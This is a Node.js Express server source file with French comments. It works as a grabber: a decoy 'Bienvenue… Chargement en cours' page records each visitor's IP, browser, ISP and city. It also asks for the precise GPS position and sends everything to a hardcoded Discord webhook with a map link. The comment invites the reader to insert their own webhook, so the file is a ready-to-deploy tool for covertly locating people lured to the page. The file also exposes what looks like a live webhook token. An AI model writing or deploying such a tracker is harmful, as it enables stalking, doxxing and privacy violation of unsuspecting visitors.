const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// REMPLACE LE TEXTE ENTRE GUILLEMETS PAR TON LIEN DISCORD :
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546990311144689736/JNIn6Zl1Dr3ep-Kvm6uwz_HHDfS8vco5ThkHLWGgkMHQOvIph6DdGUd10V3YjbEOndBE";

app.set('trust proxy', true);
app.use(express.json());

app.get('/', async (req, res) => {
  const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'Inconnu';
  const language = req.headers['accept-language'] || 'Non spécifiée';
  const timestamp = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });

  let geo = { city: 'Inconnue', country_name: 'Inconnu', org: 'Inconnu' };
  if (clientIp && !clientIp.includes('127.0.0.1') && !clientIp.includes('::1')) {
    try {
      const geoRes = await fetch(`https://ipapi.co/${clientIp}/json/`);
      if (geoRes.ok) geo = await geoRes.json();
    } catch (e) {}
  }

  if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com')) {
    try {
      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: '🔔 Connexion sur le site !',
            color: 3447003,
            fields: [
              { name: '📍 Adresse IP', value: `\`${clientIp}\``, inline: true },
              { name: '🌍 Localisation (IP)', value: `${geo.city || 'Inconnue'}, ${geo.country_name || 'Inconnu'}`, inline: true },
              { name: '🏢 Opérateur / FAI', value: geo.org || 'Inconnu', inline: false },
              { name: '📱 Appareil & Navigateur', value: userAgent, inline: false },
              { name: '⏰ Date et heure', value: timestamp, inline: true }
            ]
          }]
        })
      });
    } catch (e) {}
  }

  res.send(`
    <!DOCTYPE html>
    <html lang="fr">
    <head>
      <meta charset="UTF-8">
      <title>Bienvenue</title>
      <style>
        body { font-family: system-ui, sans-serif; display: grid; place-content: center; height: 100vh; margin: 0; background: #f0f2f5; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
      </style>
    </head>
    <body>
      <div class="card">
        <h1>Bienvenue sur le site</h1>
        <p>Chargement en cours...</p>
      </div>
      <script>
        if ("geolocation" in navigator) {
          navigator.geolocation.getCurrentPosition(async (pos) => {
            await fetch('/api/gps', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy })
            });
          });
        }
      </script>
    </body>
    </html>
  `);
});

app.post('/api/gps', async (req, res) => {
  const { lat, lng, accuracy } = req.body;
  if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL.startsWith('https://discord.com')) {
    try {
      await fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: '🎯 Position GPS exacte confirmée !',
            color: 5763719,
            fields: [
              { name: 'Coordonnées GPS', value: `\`${lat}, ${lng}\``, inline: true },
              { name: 'Précision', value: `${Math.round(accuracy)} mètres`, inline: true },
              { name: 'Carte', value: `[Ouvrir Google Maps](https://www.google.com/maps?q=${lat},${lng})`, inline: false }
            ]
          }]
        })
      });
    } catch (e) {}
  }
  res.sendStatus(200);
});

app.listen(PORT, () => console.log(`Serveur démarré sur le port ${PORT}`));